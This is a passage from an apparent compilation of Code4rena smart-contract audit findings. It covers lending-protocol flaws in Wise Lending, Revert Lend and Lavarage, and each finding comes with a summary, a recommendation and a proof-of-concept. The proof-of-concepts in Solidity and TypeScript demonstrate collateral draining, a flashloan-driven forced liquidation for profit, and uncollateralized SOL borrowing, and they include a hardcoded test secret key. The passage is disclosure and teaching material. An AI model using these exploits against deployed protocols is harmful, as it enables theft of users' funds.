            debtShares = LENDING_INSTANCE.borrowExactAmountETH(nftIdLiquidatee, borrowAmount); // borrow ETH
            vm.stopPrank();
        }
        function _marketCrashCreatesBadDebt() internal {
            // shortfall event/crash occurs
            vm.prank(MOCK_DEPLOYER);
            MOCK_CHAINLINK_2.setValue(0.3 ether);
            // borrower gets partially liquidated
            vm.startPrank(lender);
            MOCK_WETH.approve(address(LENDING_INSTANCE), depositAmountETH);
            LENDING_INSTANCE.liquidatePartiallyFromTokens(
                nftIdLiquidatee,
                nftIdLiquidator,
                address(MOCK_WETH),
                address(MOCK_ERC20_2),
                debtShares * 2e16 / 1e18 + 1
            );
            vm.stopPrank();
            // global and user bad debt is increased
            uint256 totalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();
            uint256 userBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);
            assertGt(totalBadDebt, 0);
            assertGt(userBadDebt, 0);
            assertEq(totalBadDebt, userBadDebt); // user bad debt and global bad debt are the same
        }
        function _tryToPayBackGlobalDebt() internal returns (uint256 paybackShares) {
            // lender attempts to pay back global debt
            paybackShares = LENDING_INSTANCE.userBorrowShares(nftIdLiquidatee, address(MOCK_WETH));
            uint256 paybackAmount = LENDING_INSTANCE.paybackAmount(address(MOCK_WETH), paybackShares);
            vm.startPrank(lender);
            MOCK_WETH.approve(address(FEE_MANAGER_INSTANCE), paybackAmount);

            FEE_MANAGER_INSTANCE.paybackBadDebtNoReward(
                nftIdLiquidatee,
                address(MOCK_WETH),
                paybackShares
            );
            vm.stopPrank();
            // global bad debt and user bad debt updated
            uint256 finalTotalBadDebt = FEE_MANAGER_INSTANCE.totalBadDebtETH();
            uint256 finalUserBadDebt = FEE_MANAGER_INSTANCE.badDebtPosition(nftIdLiquidatee);
            assertEq(finalUserBadDebt, 0); // user has no more bad debt, all paid off
            assertGt(finalTotalBadDebt, 0); // protocol still thinks there is bad debt
        }
    }

  ```

  </details>

## 7. [High] Liquidators can pay less than required to completely liquidate the private collateral balance of an uncollateralized position

### Check uncollateralized position

- Summary: users can choose to collateralize or uncollateralize their positions. During liquidation, the liquidator's receive amount is calculated as a percentage of the full collateral, which includes the user's private deposit. However, the reduction of the user's normal balance doesn't account for whether the position is uncollateralized, so that the liquidator can drain the user's private collateral while paying for only a portion of the liquidation, resulting in financial losses for the user and an increase in bad debt for the protocol.

- Impact & Recommendation: Move the uncollateralized position check to an earlier stage in the `calculateReceiveAmount()` function to prevent incorrect deductions from the normal balance during liquidation.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-02-wise-lending#h-04-liquidators-can-pay-less-than-required-to-completely-liquidate-the-private-collateral-balance-of-an-uncollateralized-position) & [Report](https://code4rena.com/reports/2024-02-wise-lending)

  <details><summary>POC</summary>

  ```solidity
    pragma solidity =0.8.24;
    import "forge-std/Test.sol";
    import {WiseLending, PoolManager} from "./WiseLending.sol";
    import {TesterWiseOracleHub} from "./WiseOracleHub/TesterWiseOracleHub.sol";
    import {PositionNFTs} from "./PositionNFTs.sol";
    import {WiseSecurity} from "./WiseSecurity/WiseSecurity.sol";
    import {AaveHub} from "./WrapperHub/AaveHub.sol";
    import {Token} from "./Token.sol";
    import {TesterChainlink} from "./TesterChainlink.sol";
    import {IPriceFeed} from "./InterfaceHub/IPriceFeed.sol";
    import {IERC20} from "./InterfaceHub/IERC20.sol";
    import {IWiseLending} from "./InterfaceHub/IWiseLending.sol";
    import {ContractLibrary} from "./PowerFarms/PendlePowerFarmController/ContractLibrary.sol";
    contract WiseLendingTest is Test, ContractLibrary {
    WiseLending wiseLending;
    TesterWiseOracleHub oracleHub;
    PositionNFTs positionNFTs;
    WiseSecurity wiseSecurity;
    AaveHub aaveHub;
    TesterChainlink wbtcOracle;
    // users/admin
    address alice = address(1);
    address bob = address(2);
    address charles = address(3);
    address lendingMaster;
    //tokens
    address wbtc;
    function setUp() public {
        lendingMaster = address(11);
        vm.startPrank(lendingMaster);
        address ETH_PRICE_FEED = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
        address UNISWAP_V3_FACTORY = 0x1F98431c8aD98523631AE4a59f267346ea31F984;
        address AAVE_ADDRESS = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;

        // deploy oracle hub
        oracleHub = new TesterWiseOracleHub(
        WETH,
        ETH_PRICE_FEED,
        UNISWAP_V3_FACTORY
        );
        oracleHub.setHeartBeat(
        oracleHub.ETH_USD_PLACEHOLDER(), // set USD/ETH feed heartbeat
        1
        );
        // deploy position NFT
        positionNFTs = new PositionNFTs(
            "PositionsNFTs",
            "POSNFTS",
            "app.wisetoken.net/json-data/nft-data/"
        );
        // deploy Wiselending contract
        wiseLending = new WiseLending(
        lendingMaster,
        address(oracleHub),
        address(positionNFTs)
        );
        // deploy AaveHub
        aaveHub = new AaveHub(
        lendingMaster,
        AAVE_ADDRESS,
        address(wiseLending)
        );

        // deploy Wisesecurity contract
        wiseSecurity = new WiseSecurity(
        lendingMaster,
        address(wiseLending),
        address(aaveHub)
        );
        wiseLending.setSecurity(address(wiseSecurity));
        // set labels
        vm.label(address(wiseLending), "WiseLending");
        vm.label(address(positionNFTs), "PositionNFTs");
        vm.label(address(oracleHub), "OracleHub");
        vm.label(address(wiseSecurity), "WiseSecurity");
        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charles, "Charles");
        vm.label(wbtc, "WBTC");
        vm.label(WETH, "WETH");
        // create tokens, create TestChainlink oracle, add to oracleHub
        (wbtc, wbtcOracle) = _setupToken(18, 17 ether);
        oracleHub.setHeartBeat(wbtc, 1);
        wbtcOracle.setRoundData(0, block.timestamp -1);
        // setup WETH on oracle hub
        oracleHub.setHeartBeat(WETH, 60 minutes);
        oracleHub.addOracle(WETH, IPriceFeed(ETH_PRICE_FEED), new address[](0));

        // create pools
        wiseLending.createPool(
        PoolManager.CreatePool({
            allowBorrow: true,
            poolToken: wbtc, // btc
            poolMulFactor: 17500000000000000,
            poolCollFactor: 805000000000000000,
            maxDepositAmount: 1800000000000000000000000
        })
        );
        wiseLending.createPool(
        PoolManager.CreatePool({
            allowBorrow: true,
            poolToken: WETH, // btc
            poolMulFactor: 17500000000000000,
            poolCollFactor: 805000000000000000,
            maxDepositAmount: 1800000000000000000000000
        })
        );
    }
    function _setupToken(uint decimals, uint value) internal returns (address token, TesterChainlink oracle) {
        Token _token = new Token(uint8(decimals), alice); // deploy token
        TesterChainlink _oracle = new TesterChainlink( // deploy oracle
        value, 18
        );
        oracleHub.addOracle( // add oracle to oracle hub
        address(_token),
        IPriceFeed(address(_oracle)),
        new address[](0)
        );
        return (address(_token), _oracle);
    }
    function testStealPureBalance() public {
        // deposit WETH in private and public balances for Alice's NFT
        vm.startPrank(alice);
        deal(WETH, alice, 100 ether);
        IERC20(WETH).approve(address(wiseLending), 100 ether);
        uint aliceNft = positionNFTs.reservePosition();
        wiseLending.depositExactAmount(aliceNft, WETH, 50 ether);
        wiseLending.solelyDeposit(aliceNft, WETH, 50 ether);

        // deposit for Bob's NFT to provide WBTC liquidity
        vm.startPrank(bob);
        deal(wbtc, bob, 100 ether);
        IERC20(wbtc).approve(address(wiseLending), 100 ether);
        wiseLending.depositExactAmountMint(wbtc, 100 ether);
        // Uncollateralize Alice's NFT position to allow only private(pure)
        // balance to be used as collateral
        vm.startPrank(alice);
        wiseLending.unCollateralizeDeposit(aliceNft, WETH);
        (, , uint lendCollFactor) = wiseLending.lendingPoolData(WETH);
        uint usableCollateral = 50 ether *  lendCollFactor * 95e16 / 1e36 ;

        // alice borrows
        uint borrowable = oracleHub.getTokensFromETH(wbtc, usableCollateral) - 1000;
        uint paybackShares = wiseLending.borrowExactAmount(aliceNft, wbtc, borrowable);
        vm.startPrank(lendingMaster);
        // increase the price of WBTC to make Alice's position liquidatable
        wbtcOracle.setValue(20 ether);

        // let charles get WBTC to liquidate Alice
        vm.startPrank(charles);
        uint charlesNft  = positionNFTs.reservePosition();
        uint paybackAmount = wiseLending.paybackAmount(wbtc, paybackShares);
        deal(wbtc, charles, paybackAmount);
        IERC20(wbtc).approve(address(wiseLending), paybackAmount);
        uint wbtcBalanceBefore = IERC20(wbtc).balanceOf(charles);
        uint wethBalanceBefore = IERC20(WETH).balanceOf(charles);
        // charles liquidates 40% of the shares to ensure he can reduce the pure collateral balance twice
        wiseLending.liquidatePartiallyFromTokens(aliceNft, charlesNft, wbtc, WETH, paybackShares * 40e16/1e18);
        uint wbtcBalanceChange = wbtcBalanceBefore - IERC20(wbtc).balanceOf(charles);
        uint wethBalanceChange = IERC20(WETH).balanceOf(charles) - wethBalanceBefore;

        // The amount of WETH Charles got is 2x the amount of WBTC he paid plus fees (10% of amount paid)
        // WBTC paid plus fees = 110% * wbtcBalanceChange
        // x2WBTCChangePlusFees = 2 * WBTC paid plus fees
        uint x2WBTCChangePlusFees = oracleHub.getTokensInETH(wbtc, 11e17 * wbtcBalanceChange / 1e18) * 2;

        assertApproxEqAbs(wethBalanceChange, x2WBTCChangePlusFees, 200);
    }
    }

  ```

  </details>

## 8.[Medium] No minLoanSize means liquidators will have no incentive to liquidate small positions

### `minLoanSize` = 0

- Summary: Setting `minLoanSize` to 0 removes incentives for liquidating small underwater positions, risking the protocol's financial stability. It also enables attackers to accumulate underwater debt without liquidation. This could deplete reserves and burden lenders with bad debt cleanup costs, leading to losses for both the protocol and lenders.

- Impact & Recommendation: Implementing a realistic minLoanSize will incentivize liquidators to address bad debt.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-revert-lend#m-03-no-minloansize-means-liquidators-will-have-no-incentive-to-liquidate-small-positions) & [Report](https://code4rena.com/reports/2024-03-revert-lend)

## 9.[Medium] Lack of safety buffer in `_checkLoanIsHealthy` could subject users who take out the max loan into a forced liquidation

### Lacks a safety buffer

- Summary: The `_checkLoanIsHealthy` function in V3Vault lacks a safety buffer, increasing the risk of unfair liquidation for borrowers due to minor market movements. This vulnerability could be exploited by attackers to force liquidation for profit, potentially causing significant losses for users.

- Impact & Recommendation: To prevent unfair liquidations from minor market changes, consider implementing a safety buffer for users' positions. Set a max loan threshold lower than the liquidation threshold, ensuring borrowers are protected.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-03-revert-lend#m-11-lack-of-safety-buffer-in-_checkloanishealthy-could-subject-users-who-take-out-the-max-loan-into-a-forced-liquidation) & [Report](https://code4rena.com/reports/2024-03-revert-lend)

  <details><summary>POC</summary>

  ```solidity
    contract ProofOfConcept__Vault_transform__Uv3Utils__Forced_Liquidation__Safety_Buffer is Test {
        uint256 constant Q32 = 2 ** 32;
        uint256 constant Q96 = 2 ** 96;
        uint256 constant YEAR_SECS = 31557600; // taking into account leap years
        address constant WHALE_ACCOUNT = 0xF977814e90dA44bFA03b6295A0616a897441aceC;
        IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
        IERC20 constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
        IERC20 constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
        INonfungiblePositionManager constant NPM = INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
        address EX0x = 0xDef1C0ded9bec7F1a1670819833240f027b25EfF; // 0x exchange proxy
        address UNIVERSAL_ROUTER = 0xEf1c6E67703c7BD7107eed8303Fbe6EC2554BF6B;
        address PERMIT2 = 0x000000000022D473030F116dDEE9F6B43aC78BA3;
        address constant CHAINLINK_USDC_USD = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;
        address constant CHAINLINK_DAI_USD = 0xAed0c38402a5d19df6E4c03F4E2DceD6e29c1ee9;
        address constant CHAINLINK_ETH_USD = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
        address constant UNISWAP_DAI_USDC = 0x5777d92f208679DB4b9778590Fa3CAB3aC9e2168; // 0.01% pool
        address constant UNISWAP_ETH_USDC = 0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640; // 0.05% pool
        address constant UNISWAP_DAI_USDC_005 = 0x6c6Bc977E13Df9b0de53b251522280BB72383700; // 0.05% pool
        address constant TEST_NFT_ACCOUNT = 0x3b8ccaa89FcD432f1334D35b10fF8547001Ce3e5;
        uint256 constant TEST_NFT = 126; // DAI/USDC 0.05% - in range (-276330/-276320)
        address constant TEST_NFT_ACCOUNT_2 = 0x454CE089a879F7A0d0416eddC770a47A1F47Be99;
        uint256 constant TEST_NFT_2 = 1047; // DAI/USDC 0.05% - in range (-276330/-276320)
        uint256 constant TEST_NFT_UNI = 1; // WETH/UNI 0.3%
        uint256 mainnetFork;
        V3Vault vault;
        InterestRateModel interestRateModel;
        V3Oracle oracle;
        address alice = vm.addr(9);
        address eve = vm.addr(8);
        address bob = vm.addr(7);
        bool shouldReenter = false;
        function setUp() external {
            mainnetFork = vm.createFork("https://eth-mainnet.g.alchemy.com/v2/[YOUR-RPC-URL]", 18521658);
            vm.selectFork(mainnetFork);
            // 0% base rate - 5% multiplier - after 80% - 109% jump multiplier (like in compound v2 deployed)  (-> max rate 25.8% per year)
            interestRateModel = new InterestRateModel(0, Q96 * 5 / 100, Q96 * 109 / 100, Q96 * 80 / 100);
            // use tolerant oracles (so timewarp for until 30 days works in tests - also allow divergence from price for mocked price results)
            oracle = new V3Oracle(NPM, address(USDC), address(0));
            oracle.setTokenConfig(
                address(USDC),
                AggregatorV3Interface(CHAINLINK_USDC_USD),
                3600 * 24 * 30,
                IUniswapV3Pool(address(0)),
                0,
                V3Oracle.Mode.TWAP,
                0
            );
            oracle.setTokenConfig(
                address(DAI),
                AggregatorV3Interface(CHAINLINK_DAI_USD),
                3600 * 24 * 30,
                IUniswapV3Pool(UNISWAP_DAI_USDC),
                60,
                V3Oracle.Mode.CHAINLINK_TWAP_VERIFY,
                50000
            );
            oracle.setTokenConfig(
                address(WETH),
                AggregatorV3Interface(CHAINLINK_ETH_USD),
                3600 * 24 * 30,
                IUniswapV3Pool(UNISWAP_ETH_USDC),
                60,
                V3Oracle.Mode.CHAINLINK_TWAP_VERIFY,
                50000
            );
            vault =
                new V3Vault("Revert Lend USDC", "rlUSDC", address(USDC), NPM, interestRateModel, oracle, IPermit2(PERMIT2));
            vault.setTokenConfig(address(USDC), uint32(Q32 * 9 / 10), type(uint32).max); // 90% collateral factor / max 100% collateral value
            vault.setTokenConfig(address(DAI), uint32(Q32 * 9 / 10), type(uint32).max); // 90% collateral factor / max 100% collateral value
            vault.setTokenConfig(address(WETH), uint32(Q32 * 9 / 10), type(uint32).max); // 90% collateral factor / max 100% collateral value
            vault.setLimits(0, 100_000 * 1e6, 100_000 * 1e6, 100_000 * 1e6, 100_000 * 1e6);
            // without reserve for now
            vault.setReserveFactor(0);
            vm.warp(block.timestamp + 2 days);
        }
        struct TempVariables {
            uint256 wethFlashloan;
            uint256 debt;
            uint256 fullValue;
            uint256 collateralValue;
        }
        function testForcedLiquidation() public {
                // Setup scenario
            ERC20 usdc = ERC20(address(USDC));
            ERC20 weth = ERC20(address(WETH));
            IUniswapV3Factory factory = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);
            IUniswapV3Pool usdcweth = IUniswapV3Pool(address(factory.getPool(address(usdc), address(weth), 500)));
            deal(address(usdc), address(bob), 100_000 * 1e6);
            deal(address(usdc), address(alice), 100_000 * 1e6);
            deal(address(weth), address(alice), 10 ether);
                    // Bob supplies liquidity to the pool
            vm.startPrank(address(bob));
            uint256 amount = 100_000 * 1e6;
            usdc.approve(address(vault), type(uint256).max);
            vault.deposit(amount, address(bob));
            vm.stopPrank();
                    // Alice opens a usdc - weth LP position
            vm.startPrank(address(alice));
            usdc.approve(address(NPM), type(uint256).max);
            weth.approve(address(NPM), type(uint256).max);
            // Current Tick: 200981
            // In range Position
            INonfungiblePositionManager.MintParams memory mp = INonfungiblePositionManager.MintParams({
                token0: usdcweth.token0(),
                token1: usdcweth.token1(),
                fee: usdcweth.fee(),
                tickLower: 	199460,
                tickUpper:  204520,
                amount0Desired: 50_000 * 1e6,
                amount1Desired: 10 ether,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(alice),
                deadline: block.timestamp + 1 days
            });
            (uint256 tokenId,,,) = NPM.mint(mp);
            NPM.setApprovalForAll(address(vault), true);
            vault.create(tokenId, address(alice));
            (,, uint256 collateralValue,,) = vault.loanInfo(tokenId);
            vault.borrow(tokenId, collateralValue); // Borrows max collateralValue
            vm.stopPrank();
            assertEq(weth.balanceOf(eve), 0); // Assert Eve starts with no tokens
            vm.startPrank(address(eve));
            TempVariables memory tv = TempVariables({
                wethFlashloan: 0,
                debt: 0,
                fullValue: 0,
                collateralValue: 0
            });
            tv.wethFlashloan = 30 ether; // Flashloan value
            deal(address(weth), address(eve), tv.wethFlashloan); // Simulate flashloan
            // Sink the victim's position on purpose through a swap
            weth.approve(address(0xE592427A0AEce92De3Edee1F18E0157C05861564), type(uint256).max);
            ISwapRouter swapRouter = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);
            ISwapRouter.ExactInputSingleParams memory swapParams = ISwapRouter.ExactInputSingleParams({
                tokenIn: address(weth),
                tokenOut: address(usdc),
                fee: 500,
                recipient: address(eve),
                deadline: block.timestamp,
                amountIn: tv.wethFlashloan,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });
            swapRouter.exactInputSingle(
                swapParams
            );

            // Perform a liquidation to kick the user off the protocol
            (tv.debt,tv.fullValue,tv.collateralValue,,) = vault.loanInfo(tokenId);
            usdc.approve(address(vault), type(uint256).max);
            IVault.LiquidateParams memory lp = IVault.LiquidateParams({
                tokenId: tokenId,
                debtShares: tv.debt,
                amount0Min: 0,
                amount1Min: 0,
                recipient: address(eve),
                permitData: ""
            });
            vault.liquidate(lp);

            usdc.approve(address(swapRouter), type(uint256).max);
            // Swap back all usdc and profit
            swapParams = ISwapRouter.ExactInputSingleParams({
                tokenIn: address(usdc),
                tokenOut: address(weth),
                fee: 500,
                recipient: address(eve),
                deadline: block.timestamp,
                amountIn: usdc.balanceOf(address(eve)),
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });
            swapRouter.exactInputSingle(swapParams);
            // Return flashloan
            weth.transfer(address(0), tv.wethFlashloan); // Simulate flashloan repayment by transferring to the burn address
            vm.stopPrank();

                    // Assert that Eve profited
            assertEq(weth.balanceOf(eve), 568684386651804250);
        }
        function _getTick(IUniswapV3Pool pool) internal returns(int24) {
            (,int24 tick,,,,,) = pool.slot0();
            return tick;
        }
        function _isInRange(IUniswapV3Pool pool, uint256 tokenId) internal returns(bool) {
            int24 tick = _getTick(pool);
            (,,,,,int24 lowerTick, int24 upperTick,,,,,) = NPM.positions(tokenId);
            if(tick >= lowerTick && tick <= upperTick) {
                return true;
            }
            return false;
        }
    }


  ```

  </details>

## 10.[High] A borrower can borrow SOL without backing it by a collateral

### collateral matches position

- Summary: A borrower can exploit the system to borrow SOL without providing collateral. This occurs because the borrower can open two positions simultaneously and link collateral to only one position. The borrow function checks for the existence of collateral but does not verify if it matches the correct position.

- Impact & Recommendation: On borrow validate that the TradingOpenAddCollateral has the relevant position account.
  <br> 🐬: [Source](https://code4rena.com/reports/2024-04-lavarage#h-02-a-borrower-can-borrow-sol-without-backing-it-by-a-collateral) & [Report](https://code4rena.com/reports/2024-04-lavarage)

  <details><summary>POC</summary>

  ```typescript
  import * as anchor from "@coral-xyz/anchor";
  import {
    Keypair,
    PublicKey,
    Signer,
    SystemProgram,
    SYSVAR_CLOCK_PUBKEY,
    SYSVAR_INSTRUCTIONS_PUBKEY,
    Transaction,
  } from "@solana/web3.js";
  import { Lavarage } from "../target/types/lavarage";
  import {
    createMint,
    createTransferCheckedInstruction,
    getAccount,
    getOrCreateAssociatedTokenAccount,
    mintTo,
    TOKEN_PROGRAM_ID,
  } from "@solana/spl-token";
  import { web3 } from "@coral-xyz/anchor";
  export function getPDA(programId, seed) {
    const seedsBuffer = Array.isArray(seed) ? seed : [seed];
    return web3.PublicKey.findProgramAddressSync(seedsBuffer, programId)[0];
  }
  describe("lavarage", () => {
    anchor.setProvider(anchor.AnchorProvider.env());
    const program: anchor.Program<Lavarage> = anchor.workspace.Lavarage;
    const nodeWallet = anchor.web3.Keypair.generate();
    const anotherPerson = anchor.web3.Keypair.generate();
    const seed = anchor.web3.Keypair.generate();
    // TEST ONLY!!! DO NOT USE!!!
    const oracleKeyPair = anchor.web3.Keypair.fromSecretKey(
      Uint8Array.from([
        70, 207, 196, 18, 254, 123, 0, 205, 199, 137, 184, 9, 156, 224, 62, 74,
        209, 0, 80, 73, 146, 151, 175, 68, 182, 180, 53, 91, 214, 7, 167, 209,
        140, 140, 158, 10, 59, 141, 76, 114, 109, 208, 44, 110, 77, 64, 149,
        121, 7, 226, 125, 0, 105, 29, 76, 131, 99, 95, 123, 206, 81, 5, 198, 140,
      ])
    );
    let tokenMint;
    let userTokenAccount;
    let tokenMint2;
    let userTokenAccount2;
    const provider = anchor.getProvider();
    async function mintMockTokens(
      people: Signer,
      provider: anchor.Provider,
      amount: number
    ): Promise<any> {
      const connection = provider.connection;
      const signature = await connection.requestAirdrop(
        people.publicKey,
        2000000000
      );
      await connection.confirmTransaction(signature, "confirmed");
      // Create a new mint
      const mint = await createMint(
        connection,
        people,
        people.publicKey,
        null,
        9 // Assuming a decimal place of 9
      );
      // Get or create an associated token account for the recipient
      const recipientTokenAccount = await getOrCreateAssociatedTokenAccount(
        connection,
        people,
        mint,
        provider.publicKey
      );
      // Mint new tokens to the recipient's token account
      await mintTo(
        connection,
        people,
        mint,
        recipientTokenAccount.address,
        people,
        amount
      );
      return {
        mint,
        recipientTokenAccount,
      };
    }
    // Setup phase
    it("Should mint new token!", async () => {
      const { mint, recipientTokenAccount } = await mintMockTokens(
        anotherPerson,
        provider,
        200000000000000000
        // 200000000000,
      );
      tokenMint = mint;
      userTokenAccount = recipientTokenAccount;
    }, 20000);
    it("Should create lpOperator node wallet", async () => {
      await program.methods
        .lpOperatorCreateNodeWallet()
        .accounts({
          nodeWallet: nodeWallet.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
          operator: program.provider.publicKey,
        })
        .signers([nodeWallet])
        .rpc();
    });
    it("Should create trading pool", async () => {
      const tradingPool = getPDA(program.programId, [
        Buffer.from("trading_pool"),
        provider.publicKey.toBuffer(),
        tokenMint.toBuffer(),
      ]);
      await program.methods
        .lpOperatorCreateTradingPool(50)
        .accounts({
          nodeWallet: nodeWallet.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
          operator: program.provider.publicKey,
          tradingPool,
          mint: tokenMint,
        })
        .rpc();
    });

    it("Should fund node wallet", async () => {
      await program.methods
        .lpOperatorFundNodeWallet(new anchor.BN(500000000000))
        .accounts({
          nodeWallet: nodeWallet.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
          funder: program.provider.publicKey,
        })
        .rpc();
    });
    it("Should set maxBorrow", async () => {
      const tradingPool = getPDA(program.programId, [
        Buffer.from("trading_pool"),
        provider.publicKey.toBuffer(),
        tokenMint.toBuffer(),
      ]);
      // X lamports per 1 Token
      await program.methods
        .lpOperatorUpdateMaxBorrow(new anchor.BN(50))
        .accountsStrict({
          tradingPool,
          nodeWallet: nodeWallet.publicKey,
          operator: provider.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
        })
        .rpc();
    });
    // repay
    it("Hacker can extract SOL and Collaterl", async () => {
      //
      const seed = Keypair.generate();
      const seed2 = Keypair.generate();
      const tradingPool = getPDA(program.programId, [
        Buffer.from("trading_pool"),
        provider.publicKey.toBuffer(),
        tokenMint.toBuffer(),
      ]);
      // create ATA for position account
      const positionAccount = getPDA(program.programId, [
        Buffer.from("position"),
        provider.publicKey?.toBuffer(),
        tradingPool.toBuffer(),
        // unique identifier for the position
        seed.publicKey.toBuffer(),
      ]);
      const positionATA = await getOrCreateAssociatedTokenAccount(
        provider.connection,
        anotherPerson,
        tokenMint,
        positionAccount,
        true
      );
      // create ATA for position account 2
      const positionAccount2 = getPDA(program.programId, [
        Buffer.from("position"),
        provider.publicKey?.toBuffer(),
        tradingPool.toBuffer(),
        // unique identifier for the position
        seed2.publicKey.toBuffer(),
      ]);
      const positionATA2 = await getOrCreateAssociatedTokenAccount(
        provider.connection,
        anotherPerson,
        tokenMint,
        positionAccount2,
        true
      );
      // actual borrow
      const borrowIx = await program.methods
        .tradingOpenBorrow(new anchor.BN(10), new anchor.BN(5))
        .accountsStrict({
          positionAccount,
          trader: provider.publicKey,
          tradingPool,
          nodeWallet: nodeWallet.publicKey,
          randomAccountAsId: seed.publicKey,
          // frontend fee receiver. could be any address. opening fee 0.5%
          feeReceipient: anotherPerson.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
          clock: anchor.web3.SYSVAR_CLOCK_PUBKEY,
          instructions: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
        })
        .instruction();
      const transferIx = createTransferCheckedInstruction(
        userTokenAccount.address,
        tokenMint,
        positionATA.address,
        provider.publicKey,
        100000000000000000,
        9
      );
      const transferIx2 = createTransferCheckedInstruction(
        userTokenAccount.address,
        tokenMint,
        positionATA.address, // transfer to the other account (1st pos)
        provider.publicKey,
        100000000000000000,
        9
      );
      // the param in this method is deprecated. should be removed.
      const addCollateralIx = await program.methods
        .tradingOpenAddCollateral()
        .accountsStrict({
          positionAccount,
          tradingPool,
          systemProgram: anchor.web3.SystemProgram.programId,
          trader: provider.publicKey,
          randomAccountAsId: seed.publicKey,
          mint: tokenMint,
          toTokenAccount: positionATA.address, // I need to create this account
        })
        .instruction();
      // actual borrow 2
      const borrowIx2 = await program.methods
        .tradingOpenBorrow(
          new anchor.BN(10000000000),
          new anchor.BN(5000000000)
        )
        .accountsStrict({
          positionAccount: positionAccount2,
          trader: provider.publicKey,
          tradingPool,
          nodeWallet: nodeWallet.publicKey,
          randomAccountAsId: seed2.publicKey,
          // frontend fee receiver. could be any address. opening fee 0.5%
          feeReceipient: anotherPerson.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
          clock: anchor.web3.SYSVAR_CLOCK_PUBKEY,
          instructions: anchor.web3.SYSVAR_INSTRUCTIONS_PUBKEY,
        })
        .instruction();
      // the param in this method is deprecated. should be removed.
      const addCollateralIx2 = await program.methods
        .tradingOpenAddCollateral()
        .accountsStrict({
          positionAccount: positionAccount,
          tradingPool,
          systemProgram: anchor.web3.SystemProgram.programId,
          trader: provider.publicKey,
          randomAccountAsId: seed.publicKey,
          mint: tokenMint,
          toTokenAccount: positionATA.address,
        })
        .instruction();
      let tokenAccount = await getAccount(
        provider.connection,
        positionATA.address
      );
      let tokenAccount2 = await getAccount(
        provider.connection,
        positionATA2.address
      );
      let userTokenAcc = await getAccount(
        provider.connection,
        userTokenAccount.address
      );
      console.log("===== Initial Amounts======");
      console.log("Pos#1.collateral    : ", tokenAccount.amount);
      console.log("Pos#2.collateral    : ", tokenAccount2.amount);
      console.log("Borrower Collateral : ", userTokenAcc.amount);
      console.log(
        "Node Sol            : ",
        await provider.connection.getBalance(nodeWallet.publicKey)
      );
      console.log(
        "Borrower Sol        : ",
        await provider.connection.getBalance(provider.publicKey)
      );

      const tx_borrow = new Transaction()
        .add(borrowIx)
        .add(transferIx)
        .add(addCollateralIx)
        .add(borrowIx2)
        .add(transferIx2)
        .add(addCollateralIx2); // add collateral but link it to first Pos
      await provider.sendAll([{ tx: tx_borrow }]);
      console.log("===== After Borrow #1 and #2======");

      tokenAccount = await getAccount(provider.connection, positionATA.address);

      tokenAccount2 = await getAccount(
        provider.connection,
        positionATA2.address
      );
      userTokenAcc = await getAccount(
        provider.connection,
        userTokenAccount.address
      );
      const tokenAccount_amount = tokenAccount.amount;
      const userTokenAcc_amount = userTokenAcc.amount;
      console.log("Pos#1.collateral    : ", tokenAccount_amount);
      console.log("Pos#2.collateral    : ", tokenAccount2.amount);
      console.log("Borrower Collateral : ", userTokenAcc_amount);
      const node_balance = await provider.connection.getBalance(
        nodeWallet.publicKey
      );
      const user_balance = await provider.connection.getBalance(
        provider.publicKey
      );
      console.log("Node Sol            : ", node_balance);
      console.log("Borrower Sol        : ", user_balance);
      const receiveCollateralIx = await program.methods
        .tradingCloseBorrowCollateral()
        .accountsStrict({
          positionAccount: positionAccount,
          trader: provider.publicKey,
          tradingPool,
          instructions: SYSVAR_INSTRUCTIONS_PUBKEY,
          systemProgram: anchor.web3.SystemProgram.programId,
          clock: SYSVAR_CLOCK_PUBKEY,
          randomAccountAsId: seed.publicKey,
          mint: tokenMint,
          toTokenAccount: userTokenAccount.address,
          fromTokenAccount: positionATA.address,
          tokenProgram: TOKEN_PROGRAM_ID,
        })
        .instruction();
      const repaySOLIx = await program.methods
        // .tradingCloseRepaySol(new anchor.BN(20000), new anchor.BN(9998))
        .tradingCloseRepaySol(new anchor.BN(0), new anchor.BN(9998))
        .accountsStrict({
          positionAccount: positionAccount,
          trader: provider.publicKey,
          tradingPool,
          nodeWallet: nodeWallet.publicKey,
          systemProgram: anchor.web3.SystemProgram.programId,
          clock: SYSVAR_CLOCK_PUBKEY,
          randomAccountAsId: seed.publicKey,
          feeReceipient: anotherPerson.publicKey,
        })
        .instruction();

      const tx_repay = new Transaction()
        .add(receiveCollateralIx)
        .add(repaySOLIx);
      console.log(
        ">>===== Now, repay borrow#1 only and withdraw all of my collaterals======>>"
      );
      await provider.sendAll([{ tx: tx_repay }]);
      console.log("===== After Successful Repay ======");
      tokenAccount = await getAccount(provider.connection, positionATA.address);
      tokenAccount2 = await getAccount(
        provider.connection,
        positionATA2.address
      );
      userTokenAcc = await getAccount(
        provider.connection,
        userTokenAccount.address
      );
